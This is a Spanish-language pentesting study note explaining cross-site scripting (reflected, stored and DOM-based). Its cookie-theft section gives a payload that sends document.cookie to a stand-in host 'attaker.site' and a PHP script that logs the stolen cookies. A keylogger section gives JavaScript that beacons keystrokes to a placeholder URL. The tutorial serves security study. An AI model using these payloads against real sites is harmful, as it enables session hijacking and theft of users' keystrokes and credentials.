#web 

*XSS* ó *Cross Site Scripting*, es una vulnerabilidad que permite al atacante controlar parte del contenido de una aplicación web, ejecutando código malicioso en la página web de un usuario sin su conocimiento o consentimiento De forma que pueda:

- Modificar el contenido del sitio en tiempo real.
- Inyectar contenido malicioso.
- Robar cookies de sesión.
- Hacer acciones sobre la web como si fuera un usuario legítimo.
- ...

#### Actores

- El **sitio web** vulnerable.
- Los **usuarios** de la página.
- El **pentester**.

Normalmente, esta vulnerabilidad se debe a una mala sanitización de los inputs del usuario (peticiones, cookies, formularios...). La única protección para este tipo de ataques es **nunca confiar en los inputs de un usuario**.

Hay tres tipos *reflejadas* (*reflected*), *persistentes* (*persistent*) ó *DOM based*.

### Reflected XSS

Son aquellos en los que el payload viaja en la **petición** que manda **el navegador de la víctima** al servidor. De forma que se debe mandar un enlace (p.e. mediante *phishing*) a la víctima que en caso de ser abierto pondrá en marcha el ataque.

Se llama *reflejado* porque la víctima ejecuta el payload, pero el output se ve reflejado en la máquina del atacante.

Algunos navegadores filtran este tipo de ataques, impidiendo que se lleven a cabo.

Algunas funciones útiles son:

- **fetch**, permite hacer una petición a una dirección (a tu máquina de atacante ó a un ***webhook***)
- **XMLHttpRequest**, permite administrar peticiones http:

```js
var request = new XMLHttpRequest();
request.open("<url>");
request.send();
```


### Stored XSS

Ocurre cuando se envía el payload al servidor y se almacena. Cuando se accede al recurso se pone en marcha el ataque. Se llama *persistente* ó *almacenado* porque el payload se ejecuta cada vez que se accede al recurso.

Los lugares donde suele encontrarse este tipo de XSS son los formularios que el usuario envía y se ven luego reflejados en la página (posts de foros, comentarios, parámetros del perfil, ...).

### DOM-Based

Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

- #### Robo de cookies mediante XSS

Mediante un ataque de XSS es posible robar una cookie que en la mayoría de los casos es sinónimo de secuestrar la sesión de un usuario.

Como ya sabemos, javascript puede acceder a las cookies siempre y cuando no tengan activada la flag HttpOnly, siendo posible listarlas con un payload como:

```html
<script>alert(document.cookie)</script>
```

Ó mandarlas a un sitio malicioso:

```html
<script>
var im = new Image();
im.src = "http://attaker.site/log.php?q="+document.cookie;
</script>
```

Tratándola como  una imagen, el navegador no sabrá si se trata de una imagen realmente, guardándola en dicha ruta. Y mediante *log.php* lograremos que sea el propio sitio de destino el que la guarde como archivo de texto:

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

- #### Keylogger

Se hace utilizando el método **onkeypress**:

```js
var k = "";
document.onkeypress = function(e){
	e = e || window.event; //Opcional
	k+=e.key;
	var i = new Image();
	i.src = "<url>" + k;
};
```